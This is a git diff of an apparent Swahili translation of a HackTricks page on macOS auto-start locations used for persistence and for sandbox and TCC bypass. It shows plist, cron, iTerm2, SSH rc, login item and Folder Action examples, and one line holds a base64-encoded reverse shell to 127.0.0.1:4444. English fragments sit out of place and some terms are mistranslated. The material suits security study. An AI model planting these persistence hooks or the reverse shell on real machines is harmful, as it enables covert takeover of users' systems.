@@ -16,39 +16,39 @@ Njia nyingine za kusaidia HackTricks:
 
 Sehemu hii inategemea sana kwenye mfululizo wa blogu [**Zaidi ya LaunchAgents nzuri**](https://theevilbit.github.io/beyond/), lengo ni kuongeza **Maeneo zaidi ya Kuanza Kiotomatiki** (ikiwezekana), kuonyesha **njia zipi bado zinafanya kazi** leo na toleo la karibuni la macOS (13.4) na kueleza **ruhusa** inayohitajika.
 
-## Kupuuza Sanduku la Mchanga
+## Kupita Kizuizi cha Sanduku la Mchanga
 
 {% hint style="success" %}
-Hapa unaweza kupata maeneo ya kuanza yanayofaa kwa **kupuuza sanduku la mchanga** ambayo inakuruhusu tu kutekeleza kitu kwa **kuandika kwenye faili** na **kungojea** kwa **kitendo cha kawaida sana**, kiasi cha wakati kilichopangwa au **kitendo unachoweza kufanya kawaida** ndani ya sanduku la mchanga bila kuhitaji ruhusa ya msingi.
+Hapa unaweza kupata maeneo ya kuanza yanayofaa kwa **kupita kizuizi cha sanduku la mchanga** ambayo inakuruhusu tu kutekeleza kitu kwa **kuandika kwenye faili** na **kungojea** kwa **kitendo cha kawaida sana**, kiasi **fulani cha wakati** au **kitendo unachoweza kawaida kufanya** ndani ya sanduku la mchanga bila kuhitaji ruhusa ya msingi.
 {% endhint %}
 
 ### Launchd
 
-* Inafaa kwa kupuuza sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
-* Kupuuza TCC: [🔴](https://emojipedia.org/large-red-circle)
+* Inafaa kwa kupita kizuizi cha sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
+* Kizuizi cha TCC: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Maeneo
 
 * **`/Library/LaunchAgents`**
-* **Kichocheo**: Kuanza upya
+* **Kichocheo**: Reboot
 * Inahitajika mizizi
 * **`/Library/LaunchDaemons`**
-* **Kichocheo**: Kuanza upya
+* **Kichocheo**: Reboot
 * Inahitajika mizizi
 * **`/System/Library/LaunchAgents`**
-* **Kichocheo**: Kuanza upya
+* **Kichocheo**: Reboot
 * Inahitajika mizizi
 * **`/System/Library/LaunchDaemons`**
-* **Kichocheo**: Kuanza upya
+* **Kichocheo**: Reboot
 * Inahitajika mizizi
 * **`~/Library/LaunchAgents`**
-* **Kichocheo**: Kuingia tena
+* **Kichocheo**: Ingia tena
 * **`~/Library/LaunchDemons`**
-* **Kichocheo**: Kuingia tena
+* **Kichocheo**: Ingia tena
 
 #### Maelezo & Uvamizi
 
-**`launchd`** ni **mchakato wa kwanza** unaoendeshwa na kernel ya OX S wakati wa kuanza na wa mwisho kumaliza wakati wa kuzima. Daima inapaswa kuwa na **PID 1**. Mchakato huu utasoma na kutekeleza mipangilio iliyotajwa katika **plists ya ASEP** katika:
+**`launchd`** ni **mchakato wa kwanza** unaotekelezwa na kernel ya OX S wakati wa kuanza na wa mwisho kumaliza wakati wa kuzima. Daima inapaswa kuwa na **PID 1**. Mchakato huu utasoma na kutekeleza mipangilio iliyotajwa katika **plists ya ASEP** katika:
 
 * `/Library/LaunchAgents`: Mawakala wa mtumiaji waliowekwa na msimamizi
 * `/Library/LaunchDaemons`: Daemons za mfumo zilizowekwa na msimamizi
@@ -80,11 +80,11 @@ Wakati mtumiaji anapoingia, plists zilizoko katika `/Users/$USER/Library/LaunchA
 </dict>
 </plist>
 ```
-Kuna matukio ambapo **mawakala wanahitaji kutekelezwa kabla ya mtumiaji kuingia**, hizi huitwa **PreLoginAgents**. Kwa mfano, hii ni muhimu kutoa teknolojia ya msaada wakati wa kuingia. Wanaweza kupatikana pia katika `/Library/LaunchAgents` (ona [**hapa**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) mfano).
+Kuna matukio ambapo **mawakala anahitaji kutekelezwa kabla ya mtumiaji kuingia**, hizi huitwa **PreLoginAgents**. Kwa mfano, hii ni muhimu kutoa teknolojia ya msaada wakati wa kuingia. Wanaweza kupatikana pia katika `/Library/LaunchAgents` (ona [**hapa**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) mfano).
 
 {% hint style="info" %}
-Faili mpya za usanidi za Daemons au Agents zitapakia **baada ya kuanza upya au kutumia** `launchctl load <target.plist>` Pia ni **inawezekana kupakia faili za .plist bila kipanuzi** hicho kwa kutumia `launchctl -F <file>` (hata hivyo faili hizo za plist hazitapakia moja kwa moja baada ya kuanza upya).\
-Pia ni **inawezekana kusitisha** kwa kutumia `launchctl unload <target.plist>` (mchakato ulioelekezwa na hiyo utakomeshwa),
+Faili mpya za usanidi za Daemons au Agents zitapakia **baada ya kuanza upya au kutumia** `launchctl load <target.plist>` Pia ni **inawezekana kupakia faili za .plist bila kipanuzi** hicho kwa kutumia `launchctl -F <file>` (hata hivyo faili hizo za plist hazitapakiwa moja kwa moja baada ya kuanza upya).\
+Pia ni **inawezekana kusafirisha** kwa kutumia `launchctl unload <target.plist>` (mchakato ulionyeshwa na hiyo utakomeshwa),
 
 Ili **kudhibitisha** kwamba hakuna **kitu** (kama kubadilisha) **kinazuia** **Mwakala** au **Daemon** **kutekelezwa** endesha: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
 {% endhint %}
@@ -94,7 +94,7 @@ Orodhesha mawakala na daemons wote waliopakiwa na mtumiaji wa sasa:
 launchctl list
 ```
 {% hint style="warning" %}
-Ikiwa plist inamilikiwa na mtumiaji, hata kama iko katika folda za mfumo wa daemon, **kazi itatekelezwa kama mtumiaji** na sio kama root. Hii inaweza kuzuia baadhi ya mashambulizi ya uongezaji wa mamlaka.
+Ikiwa plist inamilikiwa na mtumiaji, hata kama iko katika folda za mfumo wa daemuni, **kazi itatekelezwa kama mtumiaji** na sio kama root. Hii inaweza kuzuia baadhi ya mashambulizi ya uongezaji wa mamlaka.
 {% endhint %}
 
 ### faili za kuanza kwa shell
@@ -112,12 +112,12 @@ Maelezo (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://the
 * **Kitendo**: Fungua terminal na zsh
 * **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
 * **Kitendo**: Fungua terminal na zsh
-* Inahitaji ruhusa ya root
+* Inahitajika kuwa na ruhusa ya root
 * **`~/.zlogout`**
 * **Kitendo**: Toka kwenye terminal na zsh
 * **`/etc/zlogout`**
 * **Kitendo**: Toka kwenye terminal na zsh
-* Inahitaji ruhusa ya root
+* Inahitajika kuwa na ruhusa ya root
 * Huenda kuna zaidi katika: **`man zsh`**
 * **`~/.bashrc`**
 * **Kitendo**: Fungua terminal na bash
@@ -128,7 +128,7 @@ Maelezo (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://the
 
 #### Maelezo & Utekaji
 
-Wakati wa kuanzisha mazingira ya shell kama `zsh` au `bash`, **faili fulani za kuanza zinatekelezwa**. macOS kwa sasa inatumia `/bin/zsh` kama shell ya msingi. Shell hii inafikiwa moja kwa moja wakati programu ya Terminal inazinduliwa au wakati kifaa kinapatawa kupitia SSH. Ingawa `bash` na `sh` pia zipo katika macOS, lazima zitwezwe wazi ili kutumika.
+Wakati wa kuanzisha mazingira ya shell kama vile `zsh` au `bash`, **faili fulani za kuanza zinatekelezwa**. macOS kwa sasa inatumia `/bin/zsh` kama shell ya msingi. Shell hii inafikiwa moja kwa moja wakati programu ya Terminal inazinduliwa au wakati kifaa kinapatawa kupitia SSH. Ingawa `bash` na `sh` pia zipo katika macOS, lazima zitwezwe wazi ili kutumika.
 
 Ukurasa wa man wa zsh, ambao tunaweza kusoma kwa kutumia **`man zsh`** una maelezo marefu ya faili za kuanza.
 ```bash
@@ -138,7 +138,7 @@ echo "touch /tmp/hacktricks" >> ~/.zshrc
 ### Programu Zilizofunguliwa tena
 
 {% hint style="danger" %}
-Kuweka mazingira ya kutumia na kujiondoa na kuingia tena au hata kuzima haikufanya kazi kwangu kutekeleza programu. (Programu haikuwa inatekelezwa, labda inahitaji kuwa ikifanya kazi wakati hatua hizi zinatekelezwa)
+Kuweka mazingira ya kutumia na kujiondoa na kuingia tena au hata kuanzisha upya hakukufanyia kazi kunitekelezea programu. (Programu haikuwa inatekelezwa, labda inahitaji kuwa inatekelezwa wakati hatua hizi zinatekelezwa)
 {% endhint %}
 
 **Maelezo**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)
@@ -149,7 +149,7 @@ Kuweka mazingira ya kutumia na kujiondoa na kuingia tena au hata kuzima haikufan
 #### Mahali
 
 * **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
-* **Kichocheo**: Kuanza upya kufungua tena programu
+* **Kichocheo**: Anza upya kufungua tena programu
 
 #### Maelezo na Utekaji
 
@@ -179,7 +179,7 @@ Kuongeza programu kwenye orodha hii unaweza kutumia:
 
 * Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
 * Kukiuka TCC: [✅](https://emojipedia.org/check-mark-button)
-* Matumizi ya Terminali kuwa na ruhusa za FDA ikiwa mtumiaji anaitumia
+* Matumizi ya Terminali kuwa na ruhusa za FDA za mtumiaji anayetumia
 
 #### Mahali
 
@@ -188,7 +188,7 @@ Kuongeza programu kwenye orodha hii unaweza kutumia:
 
 #### Maelezo na Utekaji
 
-Katika **`~/Library/Preferences`** kuna mapendeleo ya mtumiaji katika Programu. Baadhi ya mapendeleo haya yanaweza kuwa na usanidi wa **kutekeleza programu/skripti nyingine**.
+Katika **`~/Library/Preferences`** kuna mapendeleo ya mtumiaji katika Programu. Baadhi ya mapendeleo haya yanaweza kuwa na usanidi wa **kutekeleza programu/zana nyingine**.
 
 Kwa mfano, Terminali inaweza kutekeleza amri wakati wa Kuanza:
 
@@ -229,7 +229,7 @@ Unaweza kuongeza hii kutoka kwa cli na:
 
 * Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
 * Kukiuka TCC: [✅](https://emojipedia.org/check-mark-button)
-* Matumizi ya Terminali kuwa na ruhusa za FDA za mtumiaji anayeitumia
+* Matumizi ya Terminali kuwa na ruhusa za FDA za mtumiaji anayetumia
 
 #### Mahali
 
@@ -240,7 +240,7 @@ Unaweza kuongeza hii kutoka kwa cli na:
 
 Ikiwa utaunda skripti ya [**`.terminal`**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) na kuifungua, programu ya **Terminal** itaitwa moja kwa moja kutekeleza amri zilizotajwa humo. Ikiwa programu ya Terminal ina ruhusa maalum (kama vile TCC), amri yako itatekelezwa na ruhusa hizo maalum.
 
-Jaribu hili na:
+Jaribu hivi:
 ```bash
 # Prepare the payload
 cat > /tmp/test.terminal << EOF
@@ -268,10 +268,10 @@ open /tmp/test.terminal
 # Use something like the following for a reverse shell:
 <string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
 ```
-Unaweza pia kutumia vifaa vya **`.command`**, **`.tool`**, na maudhui ya skripti za kawaida za shell na zitafunguliwa na Terminal pia.
+Unaweza pia kutumia vifaa vya **`.command`**, **`.tool`**, na maudhui ya skripti za kawaida za shell na zitafunguliwa na Terminal.
 
 {% hint style="danger" %}
-Ikiwa terminal ina **Upatikanaji Kamili wa Diski**, itaweza kumaliza hatua hiyo (kumbuka kwamba amri iliyotekelezwa itaonekana kwenye dirisha la terminal).
+Ikiwa terminali ina **Ruhusa Kamili ya Diski**, itaweza kumaliza hatua hiyo (kumbuka kwamba amri iliyotekelezwa itaonekana kwenye dirisha la terminali).
 {% endhint %}
 
 ### Programu za Sauti
@@ -286,20 +286,20 @@ Maelezo: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://
 #### Mahali
 
 * **`/Library/Audio/Plug-Ins/HAL`**
-* Inahitajika ruhusa ya msingi
+* Inahitaji ruhusa ya Mzizi
 * **Kichocheo**: Anza upya coreaudiod au kompyuta
 * **`/Library/Audio/Plug-ins/Components`**
-* Inahitajika ruhusa ya msingi
+* Inahitaji ruhusa ya Mzizi
 * **Kichocheo**: Anza upya coreaudiod au kompyuta
 * **`~/Library/Audio/Plug-ins/Components`**
 * **Kichocheo**: Anza upya coreaudiod au kompyuta
 * **`/System/Library/Components`**
-* Inahitajika ruhusa ya msingi
+* Inahitaji ruhusa ya Mzizi
 * **Kichocheo**: Anza upya coreaudiod au kompyuta
 
 #### Maelezo
 
-Kulingana na maelezo ya awali, inawezekana **kukusanya programu za sauti** na kuzipakia.
+Kulingana na maelezo ya awali, ni **inawezekana kuchanganya programu za sauti** na kuzipakia.
 
 ### Programu za QuickLook
 
@@ -319,14 +319,14 @@ Maelezo: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.
 
 #### Maelezo & Utekaji
 
-Programu za QuickLook zinaweza kutekelezwa unapopiga **kichocheo cha hakiki ya faili** (bonyeza nafasi na faili iliyochaguliwa kwenye Finder) na **programu-jalizi inayounga mkono aina hiyo ya faili** imewekwa.
+Programu za QuickLook zinaweza kutekelezwa unapopiga **kichocheo cha hakikisho cha faili** (bonyeza nafasi na faili iliyochaguliwa kwenye Finder) na **programu-jalizi inayounga mkono aina hiyo ya faili** imewekwa.
 
-Inawezekana kukusanya programu yako ya QuickLook, uiweke kwenye mojawapo ya maeneo yaliyotajwa hapo awali ili kuipakia kisha nenda kwenye faili inayoungwa mkono na bonyeza nafasi kuichokoza.
+Inawezekana kuchanganya programu yako ya QuickLook, kuweka kwenye mojawapo ya maeneo yaliyotajwa hapo awali ili kuipakia kisha nenda kwenye faili inayoungwa mkono na bonyeza nafasi kuichokoza.
 
 ### ~~Vifungo vya Kuingia/Kutoka~~
 
 {% hint style="danger" %}
-Hii haikufanya kazi kwangu, wala na Kuingia kwa mtumiaji wala na Kutoka kwa msingi
+Hii haikufanya kazi kwangu, wala na Vifungo vya Kuingia vya mtumiaji wala na Vifungo vya Kutoka vya mzizi
 {% endhint %}
 
 **Maelezo**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)
@@ -337,7 +337,7 @@ Hii haikufanya kazi kwangu, wala na Kuingia kwa mtumiaji wala na Kutoka kwa msin
 #### Mahali
 
 * Unahitaji kuweza kutekeleza kitu kama `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
-* `I`mejumuishwa katika `~/Library/Preferences/com.apple.loginwindow.plist`
+* `Ime`po katika `~/Library/Preferences/com.apple.loginwindow.plist`
 
 Zimepitwa na wakati lakini zinaweza kutumika kutekeleza amri wakati mtumiaji anapoingia.
 ```bash
@@ -371,12 +371,12 @@ The root user one is stored in **`/private/var/root/Library/Preferences/com.appl
 ## Kizuizi cha Mchanga wa Masharti
 
 {% hint style="success" %}
-Hapa unaweza kupata maeneo ya kuanza muhimu kwa **kizuizi cha mchanga** ambacho kinakuruhusu kutekeleza kitu kwa **kuandika kwenye faili** na **kutarajia hali sio za kawaida** kama programu maalum zilizosanikishwa, hatua za mtumiaji "zisizo za kawaida" au mazingira.
+Hapa unaweza kupata maeneo ya kuanza muhimu kwa **kizuizi cha mchanga** ambacho kinakuruhusu kutekeleza kitu kwa urahisi kwa **kuandika kwenye faili** na **kutarajia hali sio za kawaida** kama programu maalum zilizosanikishwa, hatua za mtumiaji "zisizo za kawaida" au mazingira.
 {% endhint %}
 
 ### Cron
 
-**Andika**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)
+**Maelezo**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)
 
 * Inatumika kwa kizuizi cha mchanga: [✅](https://emojipedia.org/check-mark-button)
 * Hata hivyo, unahitaji kuweza kutekeleza `crontab` binary
@@ -391,7 +391,7 @@ Hapa unaweza kupata maeneo ya kuanza muhimu kwa **kizuizi cha mchanga** ambacho 
 
 #### Maelezo & Utekaji
 
-Panga kazi za cron za **mtumiaji wa sasa** na:
+Pata kazi za cron za **mtumiaji wa sasa** na:
 ```bash
 crontab -l
 ```
@@ -413,9 +413,9 @@ crontab /tmp/cron
 
 Maelezo: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)
 
-* Inatumika kwa kuzunguka sandbox: [✅](https://emojipedia.org/check-mark-button)
+* Inatumika kwa kuzidi sandbox: [✅](https://emojipedia.org/check-mark-button)
 * Kizuizi cha TCC: [✅](https://emojipedia.org/check-mark-button)
-* iTerm2 ilikuwa na ruhusa ya TCC iliyotolewa
+* iTerm2 hutumia ruhusa za TCC zilizotolewa
 
 #### Maeneo
 
@@ -445,11 +445,11 @@ These are per-user agents that run when a user logs in. They are located in `~/L
 
 #### Launch Daemons
 
-These are system-wide daemons that run regardless of which user is logged in. They are located in `/Library/LaunchDaemons/`.
+These are system-wide daemons that start at boot time. They are located in `/Library/LaunchDaemons/`.
 
 #### Login Items
 
-These are legacy items that are launched when a user logs in. They can be found in `System Preferences > Users & Groups > Login Items`.
+These are legacy items that are launched at login and are managed in System Preferences > Users & Groups > Login Items.
 
 #### Startup Items
 
@@ -457,7 +457,7 @@ These are deprecated and no longer used in macOS.
 
 #### Startup Disk Preferences
 
-These are set in `System Preferences > Startup Disk`.
+These are stored in NVRAM and can be viewed/modified using the `nvram` command.
 ```bash
 cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
 #!/usr/bin/env python3
@@ -478,13 +478,13 @@ Skripti **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** pia i
 ```bash
 do shell script "touch /tmp/iterm2-autolaunchscpt"
 ```
-Mipangilio ya iTerm2 inapatikana katika **`~/Library/Preferences/com.googlecode.iterm2.plist`** inaweza **kuonyesha amri ya kutekelezwa** wakati terminali ya iTerm2 inapo funguliwa.
+Mipendeleo ya iTerm2 iliyoko katika **`~/Library/Preferences/com.googlecode.iterm2.plist`** inaweza **kuonyesha amri ya kutekeleza** wakati terminali ya iTerm2 inapo funguliwa.
 
-Mipangilio hii inaweza kubadilishwa katika mipangilio ya iTerm2:
+Mipangilio hii inaweza kusanidiwa katika mipangilio ya iTerm2:
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>
 
-Na amri inaonekana katika mipangilio:
+Na amri inaonekana katika mipendeleo:
 ```bash
 plutil -p com.googlecode.iterm2.plist
 {
@@ -495,8 +495,6 @@ plutil -p com.googlecode.iterm2.plist
 "Initial Text" => "touch /tmp/iterm-start-command"
 ```
 Unaweza kuweka amri ya kutekelezwa kwa:
-
-{% code overflow="wrap" %}
 ```bash
 # Add
 /usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist
@@ -525,11 +523,11 @@ Maelezo: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.
 #### Mahali
 
 * **`~/Library/Application\ Support/xbar/plugins/`**
-* **Kichocheo**: Mara xbar inapoendeshwa
+* **Kichocheo**: Mara tu xbar inapoendeshwa
 
 #### Maelezo
 
-Ikiwa programu maarufu ya [**xbar**](https://github.com/matryer/xbar) imefungwa, inawezekana kuandika script ya shelisheli katika **`~/Library/Application\ Support/xbar/plugins/`** ambayo itatekelezwa wakati xbar inapoanzishwa:
+Ikiwa programu maarufu ya [**xbar**](https://github.com/matryer/xbar) imefungwa, inawezekana kuandika script ya shell katika **`~/Library/Application\ Support/xbar/plugins/`** ambayo itatekelezwa wakati xbar inapoanzishwa:
 ```bash
 cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
 #!/bin/bash
@@ -544,7 +542,7 @@ chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
 * Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
 * Lakini Hammerspoon lazima iwe imewekwa
 * Kukiuka TCC: [✅](https://emojipedia.org/check-mark-button)
-* Inahitaji ruhusa za Ufikivu
+* Inahitaji ruhusa ya Ufikivu
 
 #### Mahali
 
@@ -553,9 +551,9 @@ chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
 
 #### Maelezo
 
-[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) inafanya kazi kama jukwaa la kiotomatiki kwa **macOS**, ikiboresha **lugha ya skripti ya LUA** kwa shughuli zake. Kwa umuhimu, inasaidia uingizaji wa nambari kamili ya AppleScript na utekelezaji wa skripti za shell, ikiboresha uwezo wake wa skripti kwa kiasi kikubwa.
+[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) inafanya kazi kama jukwaa la kiotomatiki kwa **macOS**, ikichanganya **lugha ya skripti ya LUA** kwa shughuli zake. Kwa umuhimu, inasaidia uingizaji wa nambari kamili ya AppleScript na utekelezaji wa skripti za shell, ikiboresha uwezo wake wa skripti kwa kiasi kikubwa.
 
-Programu hiyo inatafuta faili moja, `~/.hammerspoon/init.lua`, na wakati skripti inapoanza itatekelezwa.
+Programu hiyo inatafuta faili moja, `~/.hammerspoon/init.lua`, na wakati inapoanza skripti itatekelezwa.
 ```bash
 mkdir -p "$HOME/.hammerspoon"
 cat > "$HOME/.hammerspoon/init.lua" << EOF
@@ -573,7 +571,7 @@ EOF
 
 * `~/Library/Application Support/BetterTouchTool/*`
 
-Chombo hiki huruhusu kuonyesha programu au hati za kutekelezwa wakati baadhi ya mkato unapigwa. Mshambuliaji anaweza kuweza kusanidi **mkato wake mwenyewe na hatua ya kutekelezwa katika database** ili kufanya kutekeleza nambari ya kupindukia (mkato unaweza kuwa tu kubonyeza kitufe).
+Chombo hiki huruhusu kuonyesha programu au hati za kutekelezwa wakati baadhi ya mkato unapigwa. Mshambuliaji anaweza kuweza kusanidi **mkato wake mwenyewe na hatua ya kutekelezwa kwenye database** ili kufanya kutekeleza nambari ya kupindukia (mkato unaweza kuwa tu kubonyeza kitufe).
 
 ### Alfred
 
@@ -586,11 +584,11 @@ Chombo hiki huruhusu kuonyesha programu au hati za kutekelezwa wakati baadhi ya 
 
 * `???`
 
-Inaruhusu kuunda mifumo ya kazi ambayo inaweza kutekeleza nambari wakati hali fulani zinakutana. Kimsingi inawezekana kwa mshambuliaji kuunda faili ya mfumo wa kazi na kufanya Alfred iipakie (inahitajika kulipa toleo la malipo kutumia mifumo ya kazi).
+Inaruhusu kuunda mifumo ya kazi ambayo inaweza kutekeleza nambari wakati hali fulani zinakutana. Kwa uwezekano ni rahisi kwa mshambuliaji kuunda faili ya mfumo wa kazi na kufanya Alfred iipakie (inahitajika kulipa toleo la malipo kutumia mifumo ya kazi).
 
 ### SSHRC
 
-Andika: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)
+Maelezo: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)
 
 * Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
 * Lakini ssh inahitaji kuwezeshwa na kutumiwa
@@ -600,13 +598,13 @@ Andika: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.g
 #### Mahali
 
 * **`~/.ssh/rc`**
-* **Kichocheo**: Ingia kupitia ssh
+* **Kichocheo**: Kuingia kupitia ssh
 * **`/etc/ssh/sshrc`**
-* Inahitaji Mzizi
-* **Kichocheo**: Ingia kupitia ssh
+* Inahitaji mizizi
+* **Kichocheo**: Kuingia kupitia ssh
 
 {% hint style="danger" %}
-Kugeuza ssh kuwa inahitaji Ufikiaji wa Diski kamili:
+Kuwezesha ssh kunahitaji Ufikiaji wa Diski kamili:
 ```bash
 sudo systemsetup -setremotelogin on
 ```
@@ -614,7 +612,7 @@ sudo systemsetup -setremotelogin on
 
 #### Maelezo & Utekaji
 
-Kwa chaguo-msingi, isipokuwa `PermitUserRC no` katika `/etc/ssh/sshd_config`, wakati mtumiaji **anapoingia kupitia SSH** hati **`/etc/ssh/sshrc`** na **`~/.ssh/rc`** zitatekelezwa.
+Kwa chaguo-msingi, isipokuwa `PermitUserRC no` katika `/etc/ssh/sshd_config`, wakati mtumiaji **anaingia kupitia SSH** hati **`/etc/ssh/sshrc`** na **`~/.ssh/rc`** zitatekelezwa.
 
 ### **Vitu vya Kuingia**
 
@@ -649,13 +647,13 @@ osascript -e 'tell application "System Events" to delete login item "itemname"'
 ```
 Hizi vitu hifadhiwa kwenye faili **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
 
-**Vitu vya kuingia** vinaweza **pia** kuonyeshwa kwa kutumia API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) ambayo itahifadhi usanidi katika **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
+**Vitu vya kuingia** vinaweza **pia** kuashiriwa kwa kutumia API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) ambayo itahifadhi usanidi katika **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
 
 ### ZIP kama Kipengee cha Kuingia
 
 (Angalia sehemu iliyopita kuhusu Vitu vya Kuingia, hii ni nyongeza)
 
-Ikiwa unahifadhi faili ya **ZIP** kama **Kipengee cha Kuingia** **`Archive Utility`** itaifungua na ikiwa zip ilihifadhiwa kwa mfano katika **`~/Library`** na ilikuwa na Folda **`LaunchAgents/file.plist`** yenye mlango wa nyuma, folda hiyo itaundwa (haipo kwa chaguo-msingi) na plist itaongezwa hivyo wakati wa kuingia tena, **mlango wa nyuma ulioonyeshwa kwenye plist utatekelezwa**.
+Ikiwa unahifadhi faili ya **ZIP** kama **Kipengee cha Kuingia** **`Archive Utility`** itaifungua na ikiwa zip ilihifadhiwa kwa mfano katika **`~/Library`** na ilikuwa na Folda **`LaunchAgents/file.plist`** yenye mlango wa nyuma, folda hiyo itaundwa (haipo kwa chaguo-msingi) na plist itaongezwa hivyo wakati mtumiaji anapoingia tena, **mlango wa nyuma ulioashiriwa kwenye plist utatekelezwa**.
 
 Chaguo lingine lingekuwa kuunda faili **`.bash_profile`** na **`.zshenv`** ndani ya nyumbani kwa mtumiaji hivyo ikiwa folda ya LaunchAgents tayari ipo hii mbinu bado itafanya kazi.
 
@@ -673,9 +671,9 @@ Andika: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.g
 
 #### **Maelezo**
 
-Kazi za `at` zinabuniwa kwa ajili ya **kupanga kazi za mara moja** zitekelezwe wakati fulani. Tofauti na kazi za cron, kazi za `at` zinaondolewa moja kwa moja baada ya utekelezaji. Ni muhimu kufahamu kwamba kazi hizi ni thabiti kupitia kuanza upya kwa mfumo, hivyo zinaweza kuwa wasiwasi wa usalama chini ya hali fulani.
+Kazi za `at` zinabuniwa kwa ajili ya **kupanga kazi za mara moja** zitekelezwe wakati fulani. Tofauti na kazi za cron, kazi za `at` zinaondolewa moja kwa moja baada ya utekelezaji. Ni muhimu kufahamu kwamba kazi hizi ni thabiti kupitia kuanzisha upya kwa mfumo, hivyo zinaweza kuwa na wasiwasi wa usalama chini ya hali fulani.
 
-Kwa chaguo-msingi zimezimwa lakini mtumiaji wa **root** anaweza **kuwasha** **hizo** na:
+Kwa **chaguo-msingi** zimezimwa lakini mtumiaji wa **root** anaweza **kuwasha** **hizo** na:
 ```bash
 sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
 ```
@@ -739,7 +737,7 @@ Jina la faili lina orodha, nambari ya kazi, na wakati ambao imepangwa kufanya ka
 * `0001a` - nambari ya kazi katika hex, `0x1a = 26`
 * `019bdcd2` - wakati katika hex. Inawakilisha dakika zilizopita tangu epoch. `0x019bdcd2` ni `26991826` katika decimal. Tukiizidisha na 60 tunapata `1619509560`, ambayo ni `GMT: 2021. Aprili 27., Jumanne 7:46:00`.
 
-Ikiwa tunachapisha faili ya kazi, tunagundua ina taarifa ile ile tuliyopata kutumia `at -c`.
+Ikiwa tunachapisha faili ya kazi, tunagundua ina taarifa ile ile tuliyopata kwa kutumia `at -c`.
 
 ### Vitendo vya Folda
 
@@ -747,9 +745,9 @@ Maelezo: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.
 Maelezo: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
 
 * Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
-* Lakini unahitaji kuweza kuita `osascript` na hoja kuwasiliana na **`System Events`** ili uweze kusanidi Vitendo vya Folda
+* Lakini unahitaji kuweza kuita `osascript` na hoja ili kuwasiliana na **`System Events`** ili uweze kusanidi Vitendo vya Folda
 * Kukiuka TCC: [🟠](https://emojipedia.org/large-orange-circle)
-* Ina ruhusa za TCC za msingi kama Desktop, Documents na Downloads
+* Ina idhini za msingi za TCC kama Desktop, Documents na Downloads
 
 #### Mahali
 
@@ -770,7 +768,7 @@ Kuanzisha Vitendo vya Folda, una chaguo kama:
 3. Kutumia OSAScript kutuma ujumbe wa Tukio la Apple kwa `System Events.app` kwa kusanidi Vitendo vya Folda kwa njia ya programu.
 * Mbinu hii ni muhimu hasa kwa kuingiza kitendo katika mfumo, kutoa kiwango cha uthabiti.
 
-Hati ifuatayo ni mfano wa kitendo kinachoweza kutekelezwa na Vitendo vya Folda:
+Hati ifuatayo ni mfano wa kile kinaweza kutekelezwa na Vitendo vya Folda:
 ```applescript
 // source.js
 var app = Application.currentApplication();
